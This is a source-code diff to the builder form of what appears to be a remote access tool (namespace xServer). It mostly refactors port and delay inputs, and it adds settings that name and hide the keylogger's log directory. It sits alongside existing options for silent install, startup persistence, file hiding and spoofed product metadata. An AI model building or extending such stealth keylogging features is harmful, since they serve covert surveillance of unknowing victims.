@@ -32,7 +32,7 @@ namespace xServer.Forms
 
             txtTag.Text = profile.Tag;
             txtPassword.Text = profile.Password;
-            txtDelay.Text = profile.Delay.ToString();
+            numericUpDownDelay.Value = profile.Delay;
             txtMutex.Text = profile.Mutex;
             chkInstall.Checked = profile.InstallClient;
             txtInstallname.Text = profile.InstallName;
@@ -45,6 +45,8 @@ namespace xServer.Forms
             txtIconPath.Text = profile.IconPath;
             chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
             chkKeylogger.Checked = profile.Keylogger;
+            txtLogDirectoryName.Text = profile.LogDirectoryName;
+            chkHideLogDirectory.Checked = profile.HideLogDirectory;
             txtProductName.Text = profile.ProductName;
             txtDescription.Text = profile.Description;
             txtCompanyName.Text = profile.CompanyName;
@@ -64,7 +66,7 @@ namespace xServer.Forms
             profile.Tag = txtTag.Text;
             profile.Hosts = HostHelper.GetRawHosts(_hosts);
             profile.Password = txtPassword.Text;
-            profile.Delay = int.Parse(txtDelay.Text);
+            profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
             profile.InstallClient = chkInstall.Checked;
             profile.InstallName = txtInstallname.Text;
@@ -77,6 +79,8 @@ namespace xServer.Forms
             profile.IconPath = txtIconPath.Text;
             profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
             profile.Keylogger = chkKeylogger.Checked;
+            profile.LogDirectoryName = txtLogDirectoryName.Text;
+            profile.HideLogDirectory = chkHideLogDirectory.Checked;
             profile.ProductName = txtProductName.Text;
             profile.Description = txtDescription.Text;
             profile.CompanyName = txtCompanyName.Text;
@@ -91,7 +95,7 @@ namespace xServer.Forms
         {
             LoadProfile("Default");
 
-            txtPort.Text = Settings.ListenPort.ToString();
+            numericUpDownPort.Value = Settings.ListenPort;
 
             UpdateInstallationControlStates();
             UpdateStartupControlStates();
@@ -111,22 +115,15 @@ namespace xServer.Forms
 
         private void btnAddHost_Click(object sender, EventArgs e)
         {
-            if (txtHost.Text.Length < 1 || txtPort.Text.Length < 1) return;
+            if (txtHost.Text.Length < 1) return;
 
             HasChanged();
 
             var host = txtHost.Text;
-            ushort port;
-            if (!ushort.TryParse(txtPort.Text, out port))
-            {
-                MessageBox.Show("Please enter a valid port.", "Builder",
-                    MessageBoxButtons.OK, MessageBoxIcon.Information);
-                return;
-            }
+            ushort port = (ushort)numericUpDownPort.Value;
 
             _hosts.Add(new Host {Hostname = host, Port = port});
             txtHost.Text = "";
-            txtPort.Text = "";
         }
 
         #region "Context Menu"
@@ -163,16 +160,6 @@ namespace xServer.Forms
             txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
         }
 
-        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
-        }
-
-        private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
-        {
-            e.Handled = (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar));
-        }
-
         private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
         {
             e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
@@ -180,6 +167,12 @@ namespace xServer.Forms
         }
 
         private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
+                         !char.IsControl(e.KeyChar));
+        }
+
+        private void txtLogDirectoryName_KeyPress(object sender, KeyPressEventArgs e)
         {
             e.Handled = ((e.KeyChar == '\\' || FileHelper.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                          !char.IsControl(e.KeyChar));
@@ -239,7 +232,7 @@ namespace xServer.Forms
         private bool CheckForEmptyInput()
         {
             return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
-                 _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && !string.IsNullOrWhiteSpace(txtDelay.Text) && // Connection
+                 _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && // Connection
                  (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallname.Text))) && // Installation
                  (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
         }
@@ -258,7 +251,7 @@ namespace xServer.Forms
             options.Mutex = txtMutex.Text;
             options.RawHosts = HostHelper.GetRawHosts(_hosts);
             options.Password = txtPassword.Text;
-            options.Delay = int.Parse(txtDelay.Text);
+            options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
             options.InstallPath = GetInstallPath();
@@ -269,6 +262,8 @@ namespace xServer.Forms
             options.Startup = chkStartup.Checked;
             options.HideFile = chkHide.Checked;
             options.Keylogger = chkKeylogger.Checked;
+            options.LogDirectoryName = txtLogDirectoryName.Text;
+            options.HideLogDirectory = chkHideLogDirectory.Checked;
 
             if (options.Password.Length < 3)
             {
